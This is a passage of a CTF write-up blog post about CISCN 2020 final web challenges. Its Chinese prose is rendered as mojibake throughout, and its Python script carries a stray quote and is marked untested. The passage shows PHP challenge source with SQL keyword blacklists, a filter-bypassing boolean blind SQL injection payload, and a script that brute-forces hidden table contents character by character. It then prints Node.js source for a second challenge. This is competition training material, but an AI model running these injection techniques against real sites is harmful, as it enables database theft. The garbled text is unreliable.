class="token punctuation">,</span><span class="token string single-quoted-string">'join'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'in'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"/**/"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"substr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ascii"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"left"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"right"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$id_blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'left'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'right'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'like'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'('</span><span class="token punctuation">,</span><span class="token string single-quoted-string">')'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$limit_blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'-'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token function">array_merge </span><span class="token punctuation">(</span><span class="token variable">$common_blacklist</span><span class="token punctuation">,</span> <span class="token variable">$hack_list</span><span class="token punctuation">,</span> <span class="token variable">$id_blacklist</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"your param &lt;b&gt;id&lt;/b&gt; look like dangerous!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token function">array_merge </span><span class="token punctuation">(</span><span class="token variable">$common_blacklist</span><span class="token punctuation">,</span> <span class="token variable">$hack_list</span><span class="token punctuation">,</span> <span class="token variable">$limit_blacklist</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$limit</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"your param &lt;b&gt;limit&lt;/b&gt; look like dangerous!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$limit</span> <span class="token operator">&gt;</span> <span class="token number">10</span> <span class="token keyword">or</span> <span class="token variable">$limit</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"your param limit can't &gt;10 or &lt;=0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$limit</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_safe</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">,</span> <span class="token variable">$limit</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"stop , hack!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM fake_flag WHERE id = <span class="token interpolation"><span class="token variable">$id</span></span> limit 0,<span class="token interpolation"><span class="token variable">$limit</span></span>"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"database error, please check your input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//var_dump($result);</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">===</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"searched nothing"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span><span class="token operator">-&gt;</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>ä¹Ÿå°±æ˜¯è¯´ <code>id</code> è¿‡æ»¤äº†æ‹¬å·ï¼Œ<code>limit</code> è¿‡æ»¤äº† <code>-</code>ï¼Œä½†å¯ä»¥åè¿‡æ¥ï¼Œä¸”èƒ½ç”¨ <code>\t</code> ä»£æ›¿ç©ºæ ¼ï¼Œç”¨ <code>ord</code> ä»£æ›¿ <code>ascii</code>ï¼Œå°±å¯ä»¥ <strong>å¸ƒå°”ç›²æ³¨</strong> äº†ã€‚</p><p>ç¾¤é‡Œå¤§ä½¬çš„ <strong>payload</strong>:</p><pre class="language-none"><code class="language-none">id=1\tor\t{x}-/*'&amp;limit='10\tnana*/ord((select\tgroup_concat(flag)\tfrom\treal_flag))</code></pre><p>æ„é€ å‡ºæ¥çš„ SQL è¯­å¥é•¿è¿™æ ·ã€‚</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> fake_flag <span class="token keyword">WHERE</span> id <span class="token operator">=</span> <span class="token number">1</span>\tor\t{x}<span class="token operator">-</span><span class="token comment">/*' limit 0, '10\tnana*/</span>ord<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span>\tgroup_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>\tfrom\treal_flag<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>å…¶ä¸­ï¼Œ<code>ord</code>å‡½æ•°<strong>è¿”å›çš„æ˜¯å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ ASCII å€¼</strong>ï¼Œ<code>group_concat</code>å‡½æ•°<strong>è¿”å›å¸¦æœ‰æ¥è‡ªä¸€ä¸ªç»„çš„è¿æ¥çš„éNULLå€¼çš„å­—ç¬¦ä¸²ç»“æœ</strong>ï¼Œä¹Ÿå°±æ˜¯æŠŠflagå­—æ®µçš„æ•°æ®ï¼ˆé»˜è®¤ç”¨ <code>,</code> ï¼‰åˆå¹¶èµ·æ¥ã€‚</p><p><code>fake_flag</code> ä¸­æœ‰ä¸¤é¡¹ç»“æœï¼Œ<code>id</code> åˆ†åˆ«å¯¹åº”ç€1å’Œ2ã€‚</p><p><strong>å¦‚æœ or åé¢çš„è¡¨è¾¾å¼ä¸ºå‡ï¼Œå³è¯´æ˜ x å’Œ flag ä¸­çš„è¿™ä¸€ä½å¯¹ä¸Šäº†ï¼Œé‚£ä¹ˆæŸ¥è¯¢å‡ºæ¥çš„ç»“æœå°±åªæœ‰ä¸€é¡¹äº†ã€‚</strong></p><p>å¦å¤–ï¼Œå‘ç°æ²¡æœ‰æ‹¦æˆª <code>MID</code>ï¼Œå¯ä»¥ç”¨è¿™ä¸ªæ¥ç´¢å¼• flagã€‚</p><p>äºæ˜¯è¿›ä¸€æ­¥æ„é€  SQL è¯­å¥ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> fake_flag <span class="token keyword">WHERE</span> id <span class="token operator">=</span> <span class="token number">1</span>\tor\t{x}<span class="token operator">-</span><span class="token comment">/*' limit 0, '10\tnana*/</span>ord<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span>\tMID<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>\tfrom\treal_flag<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>æ‰€ä»¥å¤§æ¦‚å°±éå†ä¸€ä¸‹ x çš„å–å€¼ï¼Œä»è€ŒæŠŠ flag çˆ†ç ´å‡ºæ¥ã€‚</p><p>æ¯”å¦‚æœ¬åœ°è¯•ä¸€è¯•ï¼Œæ¯”å¦‚ <code>f</code> å¯¹åº” ASCII ä¸º 102ï¼Œæ­¤æ—¶åªæœ‰ä¸€ä¸ªç»“æœã€‚</p><p><img src="/2020/10/06/CTF_2020CISCN_final/image-20201006034849125.png" alt="sql"></p><blockquote><p>å½“ç„¶ä¹Ÿå¯ä»¥è®¾ç½® <code>id</code> ä¸ºä¸€ä¸ªä¸å­˜åœ¨çš„å€¼ï¼Œåœ¨æ­£å¸¸æƒ…å†µä¸‹æŸ¥è¯¢ä¸åˆ°ç»“æœã€‚</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> fake_flag <span class="token keyword">WHERE</span> id <span class="token operator">=</span> <span class="token number">5</span>\tor\t{x}<span class="token operator">-</span><span class="token comment">/*' limit 0, '10\tnana*/</span>ord<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span>\tMID<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>\tfrom\treal_flag<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>åŠ å…¥æ³¨å…¥è¯­å¥åï¼Œå¦‚æœ x å’Œ flag ä¸­çš„ç›¸åº”ä½ç½®å­—ç¬¦æ²¡å¯¹åº”ä¸Šï¼Œåˆ™ or ä¹‹åçš„è¡¨è¾¾å¼ç»“æœä¸ä¸º0ï¼Œå³ä¸ºçœŸï¼Œé‚£ä¹ˆæŸ¥è¯¢æ—¶å°†æœ‰ç»“æœè¿”å›ï¼›</p><p>è€Œå­—ç¬¦å¯¹åº”ä¸Šçš„è¯ï¼Œè¡¨è¾¾å¼ç»“æœä¸º0ï¼Œor å‡ºæ¥ç»“æœéƒ½ä¸ºå‡ï¼Œäºæ˜¯å°±æŸ¥è¯¢ä¸åˆ°ç»“æœã€‚</p><p>è¿™æ ·ä¹Ÿèƒ½å®ç°å¸ƒå°”ç›²æ³¨ã€‚</p></blockquote><p>å‚è€ƒç½‘ä¸Šjioæœ¬æ”¹äº†æ”¹ï¼šï¼ˆå¤§æ¦‚é€»è¾‘è¿™æ ·ï¼Œæœªå®é™…æµ‹è¯•</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringmystring <span class="token operator">=</span> string<span class="token punctuation">.</span>printable  <span class="token comment"># æ‰€æœ‰å¯è§å­—ç¬¦</span>url <span class="token operator">=</span> <span class="token string">"http://URL/"</span>url <span class="token operator">+=</span> <span class="token string">"?id=5\tor\t{0}-/*'&amp;limit='10\tnana*/ord((select\tmid(group_concat(flag),{1})\tfrom\treal_flag))"</span>"reply <span class="token operator">=</span> <span class="token string">"searched nothing"</span><span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>count <span class="token operator">=</span> <span class="token number">1</span>result <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    temp_result <span class="token operator">=</span> result    <span class="token keyword">for</span> char <span class="token keyword">in</span> mystring<span class="token punctuation">:</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> reply <span class="token keyword">in</span> response<span class="token punctuation">.</span>content<span class="token punctuation">:</span>            result <span class="token operator">+=</span> char            <span class="token keyword">print</span><span class="token punctuation">(</span>result <span class="token operator">+</span> <span class="token string">'......'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> result <span class="token operator">==</span> temp_result<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Complete!'</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    count<span class="token operator">+=</span><span class="token number">1</span></code></pre><p><em>ï¼ˆå®³ï¼Œè¿˜æ˜¯å¤ªèœäº†ï¼Œè¿å¸ƒå°”ç›²æ³¨éƒ½ä¸ä¼šå˜¤å˜¤å˜¤</em></p><h3 id="Web2-battle"><a href="#Web2-battle" class="headerlink" title="Web2 battle"></a>Web2 battle</h3><p>æ˜¯ä¸€é“ Node.js çš„é¢˜ã€‚</p><p><strong>éƒ¨åˆ†æºç ï¼š</strong></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span>  <span class="token function">getPlayerDamageValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//è®¡ç®—çº¯ç²¹ä¼¤å®³</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>player<span class="token punctuation">.</span>buff<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">keepTwoDecimal</span><span class="token punctuation">(</span>player<span class="token punctuation">.</span>aggressivity<span class="token operator">+</span>player<span class="token punctuation">.</span>buff<span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">return</span> player<span class="token punctuation">.</span>aggressivity<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">triggerPassiveSkill</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//è§¦å‘è¢«åŠ¨æŠ€èƒ½</span><span class="token punctuation">{</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>player<span class="token punctuation">.</span>career<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token string">"warrior"</span><span class="token operator">:</span>            player<span class="token punctuation">.</span>buff <span class="token operator">=</span> <span class="token number">5</span>            <span class="token keyword">return</span> <span class="token number">1</span>        <span class="token keyword">case</span> <span class="token string">"high_priest"</span> <span class="token operator">:</span>            player<span class="token punctuation">.</span><span class="token constant">HP</span> <span class="token operator">+=</span> <span class="token number">10</span>            player<span class="token punctuation">.</span><span class="token constant">HP</span> <span class="token operator">=</span> <span class="token function">keepTwoDecimal</span><span class="token punctuation">(</span>player<span class="token punctuation">.</span><span class="token constant">HP</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token number">2</span>        <span class="token keyword">case</span> <span class="token string">'shooter'</span> <span class="token operator">:</span>            player<span class="token punctuation">.</span>buff <span class="token operator">=</span> <span class="token number">7</span>            <span class="token keyword">return</span> <span class="token number">3</span>        <span class="token keyword">default</span><span class="token operator">:</span>            <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">playerUseItem</span><span class="token punctuation">(</span><span class="token parameter">round</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">//ZLYGï¼šæ²»ç–—è¯è†ï¼Œä½¿ç”¨åå›å¤10ç‚¹ç”Ÿå‘½å€¼</span>    <span class="token comment">//BYZFï¼šç™½é“¶ä¹‹é”‹ï¼Œä½¿ç”¨åçš„ä¸€æ¬¡æ”»å‡»å°†è§¦å‘æš´å‡»å¹¶é€ æˆ130%çš„ä¼¤å®³</span>    <span class="token comment">//XELDï¼šé‚ªæ¶é•°åˆ€ï¼Œä½¿ç”¨åå°†å¯¹æ–¹çš„ä¸€æ¬¡æ”»å‡»çš„æ”»å‡»åŠ›å˜ä¸º80%</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>round <span class="token operator">==</span> player<span class="token punctuation">.</span>round_to_use <span class="token operator">&amp;&amp;</span> player<span class="token punctuation">.</span>num <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        player<span class="token punctuation">.</span>num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span>player<span class="token punctuation">.</span>item<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token string">"ZLYG"</span><span class="token operator">:</span>                player<span class="token punctuation">.</span><span class="token constant">HP</span> <span class="token operator">+=</span> <span class="token number">10</span><span class="token punctuation">;</span>                <span class="token keyword">return</span>  <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"BYZF"</span><span class="token operator">:</span>                player<span class="token punctuation">.</span>buff <span class="token operator">=</span> player<span class="token punctuation">.</span>aggressivity <span class="token operator">*</span> <span class="token number">0.3</span><span class="token punctuation">;</span>                player<span class="token punctuation">.</span>buff <span class="token operator">=</span> <span class="token function">keepTwoDecimal</span><span class="token punctuation">(</span>player<span class="token punctuation">.</span>buff<span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"XELD"</span><span class="token operator">:</span>                monster<span class="token punctuation">.</span>buff <span class="token operator">=</span> monster<span class="token punctuation">.</span>aggressivity <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">-</span> <span class="token number">0.8</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                monster<span class="token punctuation">.</span>buff <span class="token operator">=</span> <span class="token function">keepTwoDecimal</span><span class="token punctuation">(</span>monster<span class="token punctuation">.</span>buff<span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">playerAttackMonster</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    monster<span class="token punctuation">.</span><span class="token constant">HP</span> <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token function">getPlayerDamageValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    monster<span class="token punctuation">.</span><span class="token constant">HP</span> <span class="token operator">=</span> <span class="token function">keepTwoDecimal</span><span class="token punctuation">(</span>monster<span class="token punctuation">.</span><span class="token constant">HP</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">monsterAttackPlayer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>monster<span class="token punctuation">.</span>buff<span class="token punctuation">)</span> <span class="token punctuation">{</span>        player<span class="token punctuation">.</span><span class="token constant">HP</span> <span class="token operator">-=</span> <span class="token punctuation">(</span>monster<span class="token punctuation">.</span>aggressivity <span class="token operator">+</span> monster<span class="token punctuation">.</span>buff<span class="token punctuation">)</span>        player<span class="token punctuation">.</span><span class="token constant">HP</span> <span class="token operator">=</span> <span class="token function">keepTwoDecimal</span><span class="token punctuation">(</span>player<span class="token punctuation">.</span><span class="token constant">HP</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token function">keepTwoDecimal</span><span class="token punctuation">(</span>monster<span class="token punctuation">.</span>aggressivity <span class="token operator">+</span> monster<span class="token punctuation">.</span>buff<span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        player<span class="token punctuation">.</span><span class="token constant">HP</span> <span class="token operator">-=</span> monster<span class="token punctuation">.</span>aggressivity        player<span class="token punctuation">.</span><span class="token constant">HP</span> <span class="token operator">=</span> <span class="token function">keepTwoDecimal</span><span class="token punctuation">(</span>player<span class="token punctuation">.</span><span class="token constant">HP</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> monster<span class="token punctuation">.</span>aggressivity    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">//......</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/start'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>body <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> req<span class="token punctuation">.</span>body<span class="token operator">==</span> <span class="token string">'object'</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>        player <span class="token operator">=</span> <span class="token punctuation">{</span>            name <span class="token operator">:</span> <span class="token string">"ciscn"</span><span class="token punctuation">,</span>            career <span class="token operator">:</span> <span class="token string">"warrior"</span><span class="token punctuation">,</span>            item <span class="token operator">:</span> <span class="token string">"BYZF"</span><span class="token punctuation">,</span>            round_to_use <span class="token operator">:</span> <span class="token number">1</span> <span class="token comment">//round_to_useè¡¨ç¤ºåœ¨å“ªä¸€è½®ä½¿ç”¨ç‰©å“</span>        <span class="token punctuation">}</span>        <span class="token keyword">let</span> tempPlayer <span class="token operator">=</span> req<span class="token punctuation">.</span>body        <span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token keyword">let</span> i <span class="token keyword">in</span> tempPlayer <span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>player<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token string">'career'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>careers<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>tempPlayer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token string">'item'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>items<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>tempPlayer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token string">'round_to_use'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">checkRound</span><span class="token punctuation">(</span>tempPlayer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> tempPlayer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">continue</span>                <span class="token punctuation">}</span>                player<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> tempPlayer<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        player<span class="token punctuation">.</span>num <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">//playerå‰©ä½™å¯`ä½¿ç”¨ç‰©å“`çš„æ¬¡æ•°</span>        player<span class="token punctuation">.</span><span class="token constant">HP</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span> <span class="token comment">//HPä¸ºè¡€é‡</span>        player<span class="token punctuation">.</span>aggressivity <span class="token operator">=</span> <span class="token function">getPlayerAggressivity</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token function">initMonster</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">"/battle"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/battle'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> player<span class="token punctuation">.</span><span class="token constant">HP</span> <span class="token operator">!==</span> <span class="token number">100</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"Forbidden"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">}</span>    <span class="token keyword">let</span> battleLog <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">let</span> round <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">do</span> <span class="token punctuation">{</span>        battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;font color="red" size="5px"&gt;Round &lt;B&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>round<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/B&gt; fight!&lt;/font&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        player<span class="token punctuation">.</span>aggressivity <span class="token operator">=</span> <span class="token function">getPlayerAggressivity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        battleLog<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token function">playerAndMonsterInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">ç©å®¶&lt;B&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>player<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token 